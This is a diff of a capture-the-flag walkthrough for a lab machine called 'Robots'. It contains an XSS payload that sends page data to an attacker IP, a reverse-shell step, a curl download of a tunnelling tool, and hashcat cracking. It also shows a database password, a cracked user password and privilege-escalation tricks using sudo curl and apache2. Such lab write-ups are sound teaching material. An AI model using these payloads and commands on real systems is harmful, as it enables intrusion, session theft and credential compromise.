@@ -1,46 +1,65 @@
 # Robots v1.7
 
-```bash
-nmap 10.48.147.28 -sC -oN nmap.scan -T 4 --min-rate 4000 -sCV
-```
+1. Run a nmap scan on IP
 
-```
-22/tcp open ssh OpenSSH 8.9p1 (protocol 2.0)
-80/tcp open http Apache httpd 2.4.61
-| http-robots.txt: 3 disallowed entries
-|\_/harming/humans /ignoring/human/orders /harm/to/self
-|\_http-server-header: Apache/2.4.61 (Debian)
-|\_http-title: 403 Forbidden
-9000/tcp open http Apache httpd 2.4.52 ((Ubuntu))
-|\_http-title: Apache2 Ubuntu Default Page: It works
-|\_http-server-header: Apache/2.4.52 (Ubuntu)
-Service Info: Host: robots.thm
-```
+   ```bash
+   nmap 10.48.147.28 -sC -oN nmap.scan -T 4 --min-rate 4000 -sCV
+   22/tcp open ssh OpenSSH 8.9p1 (protocol 2.0)
+   80/tcp open http Apache httpd 2.4.61
+   9000/tcp open http Apache httpd 2.4.52 ((Ubuntu))
+   Service Info: Host: robots.thm
+   ```
 
-When we visit to path mentioned in robots.txt. we get Forbidden. but /har/to/self is allowed. when we visit it, ther's a registration form. Loggin page reflects the username so it can be XSS vulnerability.
+2. When we visit to path mentioned in robots.txt. we get Forbidden. But /harm/to/self is allowed. When we visit it, there is a registration form. Login page reflects the username so it can be XSS vulnerability.
 
-I tried `<BS><script>fetch.('/harm/to/self/server_info.php').then(response=>response.text()).then(data=>fetch('192.168.242.92:8000/?cookie='+btoa(data)));</script>` as username
+3. Try `<script>fetch.('/harm/to/self/server_info.php').then(response=>response.text()).then(data=>fetch('192.168.242.92:8000/?cookie='+btoa(data)));</script>` as username.
+   Which will send the php cookie to server running on 8000 port. `python -m http.server 8000`
 
-Step-by-step execution in the victim’s browser:
+4. Session hijack using that cookie.
 
-<script> ... </script>
+5. go to `/admin.php`; You'll see a url checker there. Paste a link to php reverse shell. Get the reverse shell from [here](https://www.revshells.com/).
 
-Executes JavaScript in the context of the vulnerable web page after an injection (e.g., XSS).
+6. Once in shell, go to `/var/www/html/harm/to/self`. You will see `config.php`; which has database connection with username and password.
 
-fetch('/harm/to/self/server_info.php')
-Browser sends an HTTP request to the target web application endpoint server_info.php.
-Because the script runs in the page’s origin, the request includes the victim’s session cookies automatically.
+   ```php
+   <?php
+       $servername = "db";
+       $username = "robots";
+       $password = "q4qCz1OflKvKwK4S";
+       $dbname = "web";
+   ```
 
-.then(response => response.text())
-Converts the HTTP response body into plain text.
+7. `getent hosts db` to get db url.
 
-.then(data => ...)
-Receives the text returned by server_info.php.
+8. Create a tunnel for your machine to thm machine using `chisel`.
 
-btoa(data)
-Encodes the response into Base64.
-Reason: ensures special characters do not break the URL.
+   ```sh
+   #On robots.thm shell
+   curl <your-ip>:port/chisel -o chisel
+   chmod +x chisel
+   getent hosts db # to get db connection info
+   ./chisel client <your-ip>:<port> R:socks
 
-fetch('http://192.168.242.92:8000/?cookie=' + btoa(data))
-Sends another request to the attacker machine (192.168.242.92) on port 8000.
-The Base64-encoded data is appended as a query parameter.
+   #On your machine
+   ./chisel server -p <port> --socks5 --reverse
+   # on another window
+   proxychains mysql -u <username-robots> -p -h <databse-uri>
+   ```
+
+9. Now in database get the password hash for unusual username `rgiskard`. password:`dfb35334bf2a1338fa`
+   Notice that even your password hash is saved as different; and its double hashed meaning `md5(md5(password))`
+
+10. crack the password using hashcat.`hashcat -m 2600 -a 3 "dfb35334bf2a1338fa40e5fbb4ae4753" "rgiskard?d?d?d?d"`
+    password:`rgiskard2209`
+
+11. ssh into ip with md5(rgiskard2209)
+
+12. Look what can rgiskard execute by using `sudo -l`. He can use `User rgiskard may run the following commands on ubuntu-jammy:
+(dolivaw) /usr/bin/curl 127.0.0.1/*`.
+    Run as dolivaw and download a ssh public key into `/home/dolivaw/.ssh/authorized_keys`.
+    Generate key:`ssh-keygen -t rsa -b 4096 -f dolivaw_rsa`
+
+13. `sudo -l` to check whats allowed.
+
+14. after knowing that Apache can run. go to `https://gtfobins.org/` to see for apache.
+    `sudo apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/root.txt'`
